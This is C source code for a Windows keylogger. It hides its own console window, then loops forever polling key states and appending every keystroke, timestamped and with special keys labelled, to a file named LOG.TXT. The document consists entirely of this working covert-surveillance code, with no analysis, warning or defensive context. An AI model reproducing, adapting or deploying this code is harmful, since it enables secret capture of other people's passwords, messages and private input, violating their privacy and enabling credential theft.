#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <time.h>

void stealth()
{
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
}

void logTime(FILE* file)
{
    time_t t;
    struct tm* tm_info;
    char buffer[26];

    time(&t);
    tm_info = localtime(&t);

    strftime(buffer, 26, "%Y-%m-%d %H:%M:%S", tm_info);
    fprintf(file, "[%s] ", buffer);
}

int save(int keystroke, char* file)
{
    if ((keystroke == 1) || (keystroke == 2)) return 0;
    FILE* outputFile;
    outputFile = fopen(file, "a+");

    logTime(outputFile);

    switch (keystroke) {
    case 8: fprintf(outputFile, "%s", "[BACKSPACE]"); break;
    case 13: fprintf(outputFile, "%s", "\n"); break;
    case 32: fprintf(outputFile, "%s", " "); break;
    case VK_TAB: fprintf(outputFile, "%s", "[TAB]"); break;
    case VK_SHIFT: fprintf(outputFile, "%s", "[SHIFT]"); break;
    case VK_CONTROL: fprintf(outputFile, "%s", "[CONTROL]"); break;
    case VK_ESCAPE: fprintf(outputFile, "%s", "[ESCAPE]"); break;
    case VK_END: fprintf(outputFile, "%s", "[END]"); break;
    case VK_HOME: fprintf(outputFile, "%s", "[HOME]"); break;
    case VK_LEFT: fprintf(outputFile, "%s", "[LEFT]"); break;
    case VK_UP: fprintf(outputFile, "%s", "[UP]"); break;
    case VK_RIGHT: fprintf(outputFile, "%s", "[RIGHT]"); break;
    case VK_DOWN: fprintf(outputFile, "%s", "[DOWN]"); break;
    case VK_CAPITAL: fprintf(outputFile, "%s", "[CAPSLOCK]"); break;
    case VK_F1: fprintf(outputFile, "%s", "[F1]"); break;
    case VK_F2: fprintf(outputFile, "%s", "[F2]"); break;
    case VK_F3: fprintf(outputFile, "%s", "[F3]"); break;
    case VK_F4: fprintf(outputFile, "%s", "[F4]"); break;
    case VK_F5: fprintf(outputFile, "%s", "[F5]"); break;
    case VK_F6: fprintf(outputFile, "%s", "[F6]"); break;
    case VK_F7: fprintf(outputFile, "%s", "[F7]"); break;
    case VK_F8: fprintf(outputFile, "%s", "[F8]"); break;
    case VK_F9: fprintf(outputFile, "%s", "[F9]"); break;
    case VK_F10: fprintf(outputFile, "%s", "[F10]"); break;
    case VK_F11: fprintf(outputFile, "%s", "[F11]"); break;
    case VK_F12: fprintf(outputFile, "%s", "[F12]"); break;
    case 190: case 110: fprintf(outputFile, "%s", "."); break;
    default: fprintf(outputFile, "%c", keystroke);
    }
    fclose(outputFile);
    return 0;
}

int main()
{
    stealth();
    char i;

    while (1)
        for (i = 0; i <= 255; i++)
            if (GetAsyncKeyState(i) == -32767) save(i, "LOG.TXT");

    return 0;
}
